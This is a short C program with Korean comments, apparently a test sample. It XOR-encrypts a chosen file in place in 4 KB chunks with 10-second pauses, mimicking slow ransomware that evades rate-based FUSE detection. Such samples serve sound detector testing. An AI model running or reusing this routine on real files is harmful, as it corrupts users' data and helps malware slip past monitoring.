// iat_test_attack.c
// (FUSE write가 10초에 1회씩 발생하게 강제)

#define _XOPEN_SOURCE 700
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <limits.h>
#include <fcntl.h>

#define XOR_KEY 0xAA
#define CHUNK_SIZE 4096      // write를 쪼개는 핵심!
#define INTERVAL 10          // 10초 간격

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("사용법: %s <공격_대상_파일>\n", argv[0]);
        return 1;
    }

    const char *file_path = argv[1];
    struct stat st;

    if (stat(file_path, &st) != 0) {
        perror("stat");
        return 1;
    }

    int fd = open(file_path, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    off_t offset = 0;
    char buf[CHUNK_SIZE];

    printf("[*] 공격 시작: %s\n", file_path);

    while (offset < st.st_size) {
        size_t to_read = CHUNK_SIZE;
        if (offset + to_read > st.st_size) {
            to_read = st.st_size - offset;
        }

        lseek(fd, offset, SEEK_SET);
        read(fd, buf, to_read);

        for (size_t i = 0; i < to_read; i++)
            buf[i] ^= XOR_KEY;

        lseek(fd, offset, SEEK_SET);
        write(fd, buf, to_read);

        printf("[+] %ld ~ %ld write → sleep %ds\n",
               offset, offset + to_read, INTERVAL);

        sleep(INTERVAL);

        offset += to_read;
    }

    close(fd);
    printf("[*] 완료\n");
    return 0;
}
